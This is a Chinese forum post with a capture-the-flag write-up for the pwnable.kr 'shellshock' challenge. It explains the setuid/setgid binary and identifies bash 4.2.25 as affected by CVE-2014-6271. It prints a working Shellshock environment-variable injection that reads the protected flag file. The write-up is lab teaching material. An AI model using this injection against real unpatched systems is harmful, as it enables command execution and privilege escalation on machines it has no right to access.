
# [分享] pwnable.kr shellshock day8

## 题目

![题目](https://bbs.kanxue.com/upload/attach/202101/760268_BMX9AS6NNN7NRJR.png)

题目暗示使用 `bash` 的一个漏洞。

## 解题过程

### 1. 查看文件列表

![文件列表](https://bbs.kanxue.com/upload/attach/202101/760268_YHYE3VPUNF7UZWQ.png)

`flag` 文件只对创建者 `root` 和 `shellshock_pwn` 可读，对我们的登录用户 `shellshock` 不可读。`shellshock` 文件对所有用户都开放读和执行权限，而且权限里面有 `s`，因此普通用户在执行这个文件时会被赋予 `root` 权限。

### 2. 查看 shellshock.c

```c
#include <stdio.h>
int main(){
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());
    system("/home/shellshock/bash -c 'echo shock_me'");
    return 0;
}
```

**基础知识**

有效的组识别码用来决定进程执行时组的权限。

`int setresuid(uid_t ruid, uid_t euid, uid_t suid);`

`int setresgid(gid_t rgid, gid_t egid, gid_t sgid);`

参数依次是下面三个用户/组标识符：

1. Real user ID and real group ID. 这些 ID 决定谁是进程的所有者。
2. Effective user ID and effective group ID. 这些 ID 决定进程在访问共享资源时的权限。
3. Saved set-user-ID and saved set-group-ID. 这些 ID 用于 set-user-ID 和 set-group-ID 程序中，以保存执行程序时设置的相应有效 ID 的副本。set-user-ID 程序可以通过在其 real user ID 和 saved set-user-ID 中的值之间来回切换其 effective user ID 来获取和删除特权。

源码相对简单，`setresuid(getegid(), getegid(), getegid());` 和 `setresgid(getegid(), getegid(), getegid());` 是将进程的 real user ID、real group ID、effective user ID、effective group ID、saved set-user-ID、saved set-group-ID 都设置为执行目前进程有效组识别码。所以我们刚开始启动程序时，我们对程序的权限与 other 相同，即 `r+x`；在执行 `setresuid()` 和 `setresgid()` 后，我们对程序的权限与 `shock_pwn` 相同，即 `r+s`，所以此时我们拥有对 `flag` 文件的读权限。下一步是想办法执行 `cat ./flag`。

### 3. 寻找 bash 漏洞

#### 查看 bash 版本

题目暗示会用到 `bash` 的漏洞，所以先查看源代码中使用的 `bash` 版本号：

`./bash --version`

![bash 版本](https://bbs.kanxue.com/upload/attach/202101/760268_FDDYCWNXBTB83RX.png)

获得 `bash` 版本号为 `4.2.25`。

#### 查找对应 bash 版本的漏洞

直接搜索 `bash 4.2.25` 漏洞，发现 `CVE-2014-6271` 符合我们的要求，而且漏洞名称就是 Shellshock，与题目名称相同。

#### 查看漏洞原理

首先因为 `bash` 中的自定义函数，只需要函数名就能够调用该函数，如：

```bash
$foo() {echo Hello}
$foo
>Hello
# 环境变量
# KEY= foo
# VALUE=() { echo bar;}
```

所以我们可以构造检测的 payload：

![payload](https://bbs.kanxue.com/upload/attach/202101/760268_BAHPECXCFA2Q5HD.png)

环境变量：

- `KEY=foo`
- `VALUE=() { :;};echo Hello`

产生此错误的主要原因在于输入的过滤中没有严格限制边界，也没有判断参数是否合法。

#### 验证漏洞是否存在

`env x='() { :;}; echo Vulnerable CVE-2014-6271 ' ./bash -c "echo test"`

![验证漏洞](https://bbs.kanxue.com/upload/attach/202101/760268_UX2QUGQPHS4P8FQ.png)

输出了 `Vulnerable CVE-2014-6271`，所以漏洞存在。

### 4. pwn

`env x='() { :;}; bash -c "cat ./flag "' ./shellshock`

记得加上 `bash -c`，否则会报错：`/home/shellshock/bash: cat: No such file or directory`

红框内为 `flag`：

![flag](https://bbs.kanxue.com/upload/attach/202101/760268_UVJEUC37YYY4MEM.png)

## 参考文献

- 63eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4c8A6P5g2)9J5k6h3y4G2L8g2)9J5c8Y4u0W2M7%4m8G2L8Y4y4W2i4K6u0r3b7#2k6q4i4K6u0V1x3U0l9I4y4q4)9J5k6o6j5J5y4K6q4Q4x3X3g2Z5N6r3#2D9

- 540K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4m8&6k6$3q4A6L8W2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3y4e0x3&6y4U0V1H3z5o6p5.

最后于 2021-1-10 13:49 被 `cease2e` 编辑
